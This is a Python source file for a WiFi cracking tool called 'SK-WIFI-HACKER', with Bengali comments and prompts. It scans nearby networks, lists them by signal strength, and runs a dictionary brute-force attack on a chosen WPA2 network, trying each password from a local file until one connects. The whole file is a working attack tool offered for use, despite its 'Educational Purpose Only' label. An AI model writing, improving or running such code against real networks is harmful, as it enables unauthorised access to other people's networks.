# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║              SK-WIFI-HACKER  v1.0                        ║
║              Developer: SHEIKH SABBIR                    ║
║              Educational Purpose Only                    ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import threading
import itertools
from queue import Queue

# ─── Color support ────────────────────────────────────────
try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
    class Style:
        BRIGHT=DIM=RESET_ALL=""
    class Back:
        BLACK=RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""

# ─── WiFi library ─────────────────────────────────────────
try:
    import pywifi
    from pywifi import const
except ImportError:
    print("[!] pywifi install করা নেই। চালাও: pip install pywifi comtypes")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════
#  BANNER  (RGB animation)
# ═══════════════════════════════════════════════════════════

BANNER_LINES = [
    r"  ███████╗██╗  ██╗       ██╗    ██╗██╗███████╗██╗",
    r"  ██╔════╝██║ ██╔╝       ██║    ██║██║██╔════╝██║",
    r"  ███████╗█████╔╝        ██║ █╗ ██║██║█████╗  ██║",
    r"  ╚════██║██╔═██╗        ██║███╗██║██║██╔══╝  ██║",
    r"  ███████║██║  ██╗       ╚███╔███╔╝██║██║     ██║",
    r"  ╚══════╝╚═╝  ╚═╝        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝",
    r"",
    r"     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ",
    r"     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗",
    r"     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝",
    r"     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗",
    r"     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║",
    r"     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
]

RGB_COLORS = [
    Fore.RED,
    Fore.YELLOW,
    Fore.GREEN,
    Fore.CYAN,
    Fore.BLUE,
    Fore.MAGENTA,
]


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    """RGB animated banner"""
    for line in BANNER_LINES:
        # প্রতিটা লাইনে আলাদা color (rainbow effect)
        color = RGB_COLORS[len(line) % len(RGB_COLORS)]
        print(Style.BRIGHT + color + line + Style.RESET_ALL)
        time.sleep(0.03)

    print()
    print(Fore.CYAN + Style.BRIGHT +
          "  ╔════════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║        DEVELOPER :  SHEIKH  SABBIR                 ║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║        VERSION   :  1.0                            ║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║        MODE      :  WiFi Scanner + Brute Force     ║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ╚════════════════════════════════════════════════════╝")
    print()


def print_separator():
    print(Fore.MAGENTA + "─" * 60 + Style.RESET_ALL)


# ═══════════════════════════════════════════════════════════
#  WiFi SCANNER
# ═══════════════════════════════════════════════════════════

class WiFiScanner:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]

    def scan(self, delay=4):
        """কাছের সব WiFi network scan করে"""
        print(Fore.YELLOW + "[*] Scanning WiFi networks..." + Style.RESET_ALL)
        self.iface.scan()
        time.sleep(delay)

        results = self.iface.scan_results()
        networks = []

        for n in results:
            if not n.ssid or n.ssid.strip() == "":
                continue
            networks.append({
                "ssid": n.ssid.strip(),
                "signal": n.signal,
                "bssid": n.bssid,
                "akm": n.akm,
                "cipher": n.cipher,
            })

        # একই SSID থাকলে best signal রাখো
        best = {}
        for n in networks:
            if n["ssid"] not in best or n["signal"] > best[n["ssid"]]["signal"]:
                best[n["ssid"]] = n

        # Signal অনুযায়ী sort (best first)
        return sorted(best.values(), key=lambda x: x["signal"], reverse=True)


def signal_bars(signal):
    """Signal strength কে bar এ convert করে"""
    if signal >= -50:   return Fore.GREEN + "▂▄▆█" + Style.RESET_ALL
    elif signal >= -60: return Fore.GREEN + "▂▄▆_" + Style.RESET_ALL
    elif signal >= -70: return Fore.YELLOW + "▂▄__" + Style.RESET_ALL
    elif signal >= -80: return Fore.RED + "▂___" + Style.RESET_ALL
    else:               return Fore.RED + "____" + Style.RESET_ALL


def lock_icon(akm):
    """Security type বোঝায়"""
    if not akm or akm[0] == 0:
        return Fore.RED + "🔓 OPEN" + Style.RESET_ALL
    if any(a in (const.AKM_TYPE_WPA, const.AKM_TYPE_WPA2PSK) for a in akm):
        return Fore.YELLOW + "🔒 WPA/WPA2" + Style.RESET_ALL
    if const.AKM_TYPE_WPA2PSK in akm:
        return Fore.YELLOW + "🔒 WPA2" + Style.RESET_ALL
    return Fore.YELLOW + "🔒 SECURED" + Style.RESET_ALL


def show_networks(networks):
    """Numbered list (1, 2, 3...) এ দেখায়"""
    print()
    print_separator()
    print(Fore.CYAN + Style.BRIGHT +
          f"  {'#':<4} {'WiFi NAME':<28} {'SIGNAL':<8} {'BARS':<8} SECURITY")
    print_separator()

    for i, net in enumerate(networks, start=1):
        num = Fore.GREEN + Style.BRIGHT + f"[{i}]" + Style.RESET_ALL
        name = Fore.WHITE + Style.BRIGHT + net["ssid"][:26].ljust(28) + Style.RESET_ALL
        sig = Fore.CYAN + f"{net['signal']:>4} dBm".ljust(8) + Style.RESET_ALL
        bars = signal_bars(net["signal"]).ljust(8)
        lock = lock_icon(net["akm"])
        print(f"  {num:<6} {name} {sig} {bars} {lock}")

    print_separator()
    print()


# ═══════════════════════════════════════════════════════════
#  PASSWORD LOADER
# ═══════════════════════════════════════════════════════════

def load_passwords(file_path="password.txt"):
    if not os.path.exists(file_path):
        print(Fore.RED + f"[!] File not found: {file_path}" + Style.RESET_ALL)
        return []

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        pw_list = [line.strip() for line in f if line.strip()]

    print(Fore.GREEN + f"[✓] Loaded {len(pw_list)} passwords" + Style.RESET_ALL)
    return pw_list


# ═══════════════════════════════════════════════════════════
#  BRUTE FORCE ENGINE
# ═══════════════════════════════════════════════════════════

class SKBruteForcer:
    def __init__(self, ssid, passwords):
        self.ssid = ssid
        self.passwords = passwords
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.found = None
        self.stop_flag = threading.Event()
        self.attempt = 0
        self.lock = threading.Lock()

    def _try_password(self, password):
        """একটা password দিয়ে connect try করে"""
        try:
            self.iface.disconnect()
            time.sleep(0.3)
            self.iface.remove_all_network_profiles()

            profile = pywifi.Profile()
            profile.ssid = self.ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            tmp = self.iface.add_network_profile(profile)
            self.iface.connect(tmp)

            # Connection verify
            for _ in range(6):
                time.sleep(1)
                if self.iface.status() == const.IFACE_CONNECTED:
                    # SSID verify
                    try:
                        profiles = self.iface.network_profiles()
                        for p in profiles:
                            if p.ssid == self.ssid and p.key == password:
                                return True
                    except Exception:
                        pass
                    return True
            return False
        except Exception:
            return False

    def start(self):
        """Main loop — প্রতিটা password try করে"""
        total = len(self.passwords)
        print()
        print_separator()
        print(Fore.CYAN + Style.BRIGHT +
              f"  🎯 TARGET : {self.ssid}")
        print(Fore.CYAN + Style.BRIGHT +
              f"  📋 TOTAL  : {total} passwords")
        print(Fore.CYAN + Style.BRIGHT +
              f"  ⏱  START  : {time.strftime('%H:%M:%S')}")
        print_separator()
        print()

        start_time = time.time()

        for i, pw in enumerate(self.passwords, start=1):
            if self.stop_flag.is_set():
                break

            elapsed = time.time() - start_time
            eta = (elapsed / i) * (total - i) if i > 0 else 0

            # Progress line (overwrite)
            progress = f"[{i:>5}/{total}]  Trying: {pw:<20}"
            sys.stdout.write("\r" + Fore.YELLOW + progress + Style.RESET_ALL)
            sys.stdout.flush()

            success = self._try_password(pw)

            if success:
                self.found = pw
                print("\n")
                print(Fore.GREEN + Style.BRIGHT +
                      "  ╔════════════════════════════════════════════════╗")
                print(Fore.GREEN + Style.BRIGHT +
                      "  ║        ✅  PASSWORD  FOUND  ✅                 ║")
                print(Fore.GREEN + Style.BRIGHT +
                      "  ╚════════════════════════════════════════════════╝")
                print()
                print(Fore.GREEN + Style.BRIGHT +
                      f"  🔑 SSID     : {self.ssid}")
                print(Fore.GREEN + Style.BRIGHT +
                      f"  🔓 PASSWORD : {pw}")
                print(Fore.GREEN + Style.BRIGHT +
                      f"  ⏱  TIME     : {elapsed:.1f} sec")
                print(Fore.GREEN + Style.BRIGHT +
                      f"  🎯 ATTEMPTS : {i}")
                print()
                print(Fore.CYAN + "  এখন তুমি manually connect করতে পারো" + Style.RESET_ALL)
                print()
                return pw

        # Not found
        print("\n")
        print(Fore.RED + Style.BRIGHT +
              f"  ❌ '{self.ssid}' এর জন্য password পাওয়া যায়নি ({total} টা try করা হয়েছে)" +
              Style.RESET_ALL)
        return None


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def main():
    clear_screen()

    # Animated banner
    print_banner()
    time.sleep(0.5)

    # Scan
    try:
        scanner = WiFiScanner()
    except Exception as e:
        print(Fore.RED + f"[!] WiFi interface পাওয়া যায়নি: {e}" + Style.RESET_ALL)
        sys.exit(1)

    networks = scanner.scan(delay=4)

    if not networks:
        print(Fore.RED + "[!] কোনো WiFi পাওয়া যায়নি। আবার চেষ্টা করো।" + Style.RESET_ALL)
        return

    # Numbered list দেখাও
    show_networks(networks)

    # User input
    print(Fore.CYAN + Style.BRIGHT +
          "  📡 নম্বর টাইপ করো (1, 2, 3...) অথবা 'r' = rescan, 'q' = quit" + Style.RESET_ALL)
    print()

    while True:
        try:
            choice = input(Fore.GREEN + Style.BRIGHT + "  SK-HACKER ❯ " + Style.RESET_ALL).strip()
        except (KeyboardInterrupt, EOFError):
            print("\n" + Fore.YELLOW + "  Bye! 👋" + Style.RESET_ALL)
            return

        if choice.lower() in ("q", "quit", "exit"):
            print(Fore.YELLOW + "  Bye! 👋" + Style.RESET_ALL)
            return

        if choice.lower() in ("r", "rescan"):
            networks = scanner.scan(delay=4)
            show_networks(networks)
            continue

        if not choice.isdigit():
            print(Fore.RED + "  [!] Number দাও (1, 2, 3...) বা 'r'/'q'" + Style.RESET_ALL)
            continue

        idx = int(choice)
        if idx < 1 or idx > len(networks):
            print(Fore.RED + f"  [!] 1 থেকে {len(networks)} এর মধ্যে দাও" + Style.RESET_ALL)
            continue

        target = networks[idx - 1]
        print()
        print(Fore.YELLOW + Style.BRIGHT +
              f"  🎯 Selected: {target['ssid']}  (Signal: {target['signal']} dBm)" +
              Style.RESET_ALL)

        # Password file check
        pw_file = "password.txt"
        passwords = load_passwords(pw_file)
        if not passwords:
            print(Fore.RED + f"  [!] {pw_file} file এ password নেই।" + Style.RESET_ALL)
            return

        # Start attack
        print(Fore.MAGENTA + Style.BRIGHT +
              "\n  🚀 Attack শুরু হচ্ছে... (Ctrl+C দিয়ে থামাতে পারো)\n" + Style.RESET_ALL)
        time.sleep(1)

        forcer = SKBruteForcer(target["ssid"], passwords)
        try:
            result = forcer.start()
        except KeyboardInterrupt:
            print("\n" + Fore.YELLOW + "  ⏹ User stopped." + Style.RESET_ALL)
            result = None

        print()
        print_separator()
        print(Fore.CYAN + "  চাইলে আরেকটা WiFi select করতে পারো, 'r' = rescan, 'q' = quit" + Style.RESET_ALL)
        print_separator()
        print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "  Bye! 👋" + Style.RESET_ALL)